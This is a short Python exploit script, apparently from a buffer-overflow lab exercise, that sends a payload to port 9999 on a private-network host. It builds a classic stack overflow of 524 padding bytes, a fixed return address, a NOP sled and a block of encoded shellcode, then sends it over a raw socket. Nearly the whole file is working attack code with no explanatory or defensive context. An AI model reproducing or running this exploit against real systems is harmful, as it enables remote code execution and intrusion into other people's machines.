#!/user/bin/python3
import socket

host = "10.0.2.4"
defaultPort = 9999

exploit = (
    b"\xb8\x2f\xf3\xfc\xa8\xd9\xc2\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
    b"\x52\x31\x46\x12\x83\xee\xfc\x03\x69\xfd\x1e\x5d\x89\xe9\x5d"
    b"\x9e\x71\xea\x01\x16\x94\xdb\x01\x4c\xdd\x4c\xb2\x06\xb3\x60"
    b"\x39\x4a\x27\xf2\x4f\x43\x48\xb3\xfa\xb5\x67\x44\x56\x85\xe6"
    b"\xc6\xa5\xda\xc8\xf7\x65\x2f\x09\x3f\x9b\xc2\x5b\xe8\xd7\x71"
    b"\x4b\x9d\xa2\x49\xe0\xed\x23\xca\x15\xa5\x42\xfb\x88\xbd\x1c"
    b"\xdb\x2b\x11\x15\x52\x33\x76\x10\x2c\xc8\x4c\xee\xaf\x18\x9d"
    b"\x0f\x03\x65\x11\xe2\x5d\xa2\x96\x1d\x28\xda\xe4\xa0\x2b\x19"
    b"\x96\x7e\xb9\xb9\x30\xf4\x19\x65\xc0\xd9\xfc\xee\xce\x96\x8b"
    b"\xa8\xd2\x29\x5f\xc3\xef\xa2\x5e\x03\x66\xf0\x44\x87\x22\xa2"
    b"\xe5\x9e\x8e\x05\x19\xc0\x70\xf9\xbf\x8b\x9d\xee\xcd\xd6\xc9"
    b"\xc3\xff\xe8\x09\x4c\x77\x9b\x3b\xd3\x23\x33\x70\x9c\xed\xc4"
    b"\x77\xb7\x4a\x5a\x86\x38\xab\x73\x4d\x6c\xfb\xeb\x64\x0d\x90"
    b"\xeb\x89\xd8\x37\xbb\x25\xb3\xf7\x6b\x86\x63\x90\x61\x09\x5b"
    b"\x80\x8a\xc3\xf4\x2b\x71\x84\xf0\xab\x7b\x52\x6d\xae\x7b\x4b"
    b"\x31\x27\x9d\x01\xd9\x61\x36\xbe\x40\x28\xcc\x5f\x8c\xe6\xa9"
    b"\x60\x06\x05\x4e\x2e\xef\x60\x5c\xc7\x1f\x3f\x3e\x4e\x1f\x95"
    b"\x56\x0c\xb2\x72\xa6\x5b\xaf\x2c\xf1\x0c\x01\x25\x97\xa0\x38"
    b"\x9f\x85\x38\xdc\xd8\x0d\xe7\x1d\xe6\x8c\x6a\x19\xcc\x9e\xb2"
    b"\xa2\x48\xca\x6a\xf5\x06\xa4\xcc\xaf\xe8\x1e\x87\x1c\xa3\xf6"
    b"\x5e\x6f\x74\x80\x5e\xba\x02\x6c\xee\x13\x53\x93\xdf\xf3\x53"
    b"\xec\x3d\x64\x9b\x27\x86\x84\x7e\xed\xf3\x2c\x27\x64\xbe\x30"
    b"\xd8\x53\xfd\x4c\x5b\x51\x7e\xab\x43\x10\x7b\xf7\xc3\xc9\xf1"
    b"\x68\xa6\xed\xa6\x89\xe3")

shellcode = b"A" * 524 + b"\xF3\x12\x17\x31" + b"\x90" * 32 + exploit

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((host, defaultPort))
    s.send(shellcode)
except:
    print("check debugger")
finally:
    s.close()
